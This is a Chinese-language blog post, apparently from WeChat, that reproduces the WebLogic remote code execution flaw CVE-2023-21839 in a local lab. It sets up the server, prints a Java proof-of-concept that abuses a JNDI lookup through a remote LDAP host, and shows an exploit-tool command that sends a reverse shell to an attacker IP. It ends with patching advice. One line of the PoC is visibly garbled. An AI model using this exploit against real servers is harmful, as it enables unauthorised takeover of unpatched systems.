> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/72kVSRBo5rcWWA2LoL819A)

  

**CVE-2023-21839 漏洞复现**

  

===

**播**

**种**

**希**

**望**

- TREE PLANTING DAY -

**0****1**

**前言**

WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器，将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

CVE-2023-21839 远程代码可执行，是关于 Weblogic 的漏洞。该漏洞允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞

**02**

**研究环境**

>   

> 1、Weblogic=12.2.1.3.0\12.2.1.4.0\14.1.1.0.0
> 
> 2、jdk 环境  jdk1.8.0_361
> 
> 3、JNDI 漏洞利用工具
> 
> 4、CVE-2023-21839 源程序或工具，此类 POC 已公开，可以参考本文，也可进入 github 上面找

**03**

**环境安装**

环境安装，主要是安装 weblogic 环境，这里网上有很多相关的网址，这里提供 weblogic 下载地址：

> http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html。

本次研究，下载的版本是 12.2.1.3.0，下面主要说明几个常见的安装问题。

（1）命令行界面闪退

解决方案是使用管理员身份运行

（2）JDK 环境不适配，安装界面出现：“NO JAVA_HOME” 这样的字样。

之前安装的 JDK 环境过低，并且在系统环境配置的时候，没有创建 java_home，导致这里无法安装。

这里推荐 jdk1.8.0_361，然后系统配置尽量简单，最好置顶，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicj4woEFicIpK1vDQeianI4QjBWvia2MibMqXMkj19daKz8JXMQedibwpQqbZg/640?wx_fmt=png)

安装环境配置好后，界面会自动弹出安装界面，如下图：

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjicZNk6FicH5STBiak8icPrtBPSYicCpfBicO4XbQTz8XktLY3hIojKGvAcAg/640?wx_fmt=png)

（3）安装界面运行完成之后，没有弹出配置窗口，出现 “不应存在 C:\windows\system32”。

网上有教程让查看日志，这是不准确的，我发现不能解决此类问题。这里提供的解决方案是整理系统变量，可能会因为某一个符号，导致本次安装失败。

下图是配置导向界面：

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjmcSuMpSLNdPZLMZnLu134vzbRUOvDOutI6YdWPM3x6Pa5A1MMYQS8A/640?wx_fmt=png)

然后进入

C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain 路径，双击 startWebLogic.bat，使用浏览器访问 localhost:7001/console 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjKia5XwrjN7jtfKGvKtLLibW7aJhiaDwtZiboRNKNZIhCeaf2PwpCVdKh7A/640?wx_fmt=png)

**04**

**环境验证**

使用 namp 探测目标的端口和服务，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjHhISgcNSPd9g4aop32pEY8AMr2yW92I8usHs9AHKEMicAeibMuveJfKQ/640?wx_fmt=png)

**05**

**漏洞利用**

漏洞利用的 POC：

```
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;
public class BindRce {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    //iiop
    public static void main(String args[]) throws Exception {
       InitialContext c=getInitialContext("t3://127.0.0.1:7001");
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();
        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f,env);
        Field remoteJNDI);
        remoteJNDIName.setAccessible(true);
        remoteJNDIName.set(f,"ldap://xxxxxxxx/xxx");
        c.bind("xxxx",f);
        c.lookup("xxx");    }
}

```

使用 IDEA 进行编译，会爆出很多错误。这里遇到的异常是：不存在 weblogic.deployment.jms.jar；这里提供的解决方法是：进入 weblogic 的安装路径：

C:\Oracle\Middleware\Oracle_Home\wlserver\server\lib，

命令行执行：

```
java -jar
C:\Oracle\Middleware\Oracle_Home\wlserver\modules\com.bea.core.jarbuilder.jar

```

此时会生成对应的 jar 包。

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjbicu3HZ0vJASKEzWiaLaW4P2d0ZJdk5LygygKMC5aPzntBG2qFTytATQ/640?wx_fmt=png)

然后复制该文件到本地的 IDEA 任意路径下，

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjIg3ricW4yupCrBicYVCk9rOMS0ia9f15p82V3GBMlWFFNYFwffn4qMpibA/640?wx_fmt=png)

在 IDEA 的项目结构中模块下，导入 jar 包，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicj8vuChmKq8FrgJv9UKeUbiczGIccgmslWiaeJwjicbMlnibmlUFPqiagEJtQ/640?wx_fmt=png)

最后运行成功，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjeb2Of0LEa4PVscQicesibHIicoia0fptlmj9QjjJlUBSj0gqvvqibaB3Ijw/640?wx_fmt=png)

配合 DNSLog 开发平台，对目标 weblogic 进行访问，语句如下：

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjD4N1ibE6gcTLWzhzFk0ibQuS9NLDjKPQOSNQMpc953WyiaOs1ib9vicic1ibQ/640?wx_fmt=png)

发现 DNSLog 上面有回显。

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjh0XkOoSIglpUvYClSNKqnKslR6KnAa9WpBRp0nYm6RRoYWtgM8d14g/640?wx_fmt=png)

使用 JNDI 命令注入工具在本地创建 LDAP 和 web 服务。然后将 ldap 的对象换成本地主机，如下图所示，成功弹出计算机。

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjOB6mkYzOuicvROtatqgicJ1Aial8cnWuibbu1iaB7SJ1AnEy8Q5hUn0PGiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjyz0WW03qWVv27RSjiaxpNBiboQEKKcl5FcTfEwdqicUzpkQkyicm1Us3Gg/640?wx_fmt=png)

对于某些实际场景中，可以利用 nc 进行监听，这样做的好处是一旦利用成功，不会在目标机器中回显。

```
CVE-2023-21839.exe -ip 192.168.183.136 -port 7001 -ldap ldap://192.168.183.100:1389/Basic/ReverseShell/x.x.x.x/6666

```

![](https://mmbiz.qpic.cn/mmbiz_png/jh8AoFDREeGHUp6HL57rXd6icZAmarAicjFEotZMg1nStUnribtqVdVOURYlqIHwMRxrjGL3pRrxOhE0c2Zic13FeQ/640?wx_fmt=png)

**06**

**修复建议**

1、安装 Weblogic 最新安全补丁。

参考 https://www.oracle.com/security-alerts/cpujan2023.html

Oracle WebLogic Server 12c：

使用 opatch apply 安装补丁

```
C:\Oracle\Middleware\Oracle_Home\OPatch>opatch apply 本机补丁地址

```

Oracle WebLogic Server 11g：

```
bsu.cmd -install -patch_download_dir=C:\Oracle\Middleware\utils\bsu\cache_dir -patchlist=3L3H -prod_dir=C:\Oracle\Middleware\wlserver_10.3

```

2、关闭 T3 和 iiop 协议端口

![](https://mmbiz.qpic.cn/mmbiz_gif/jh8AoFDREeGHUp6HL57rXd6icZAmarAicj5kOwUJqcSb7dKrpjUuIlSbGC6QXv0cqt6vA1lTwpceC3Fj0ZuBOvjA/640?wx_fmt=gif)

**END**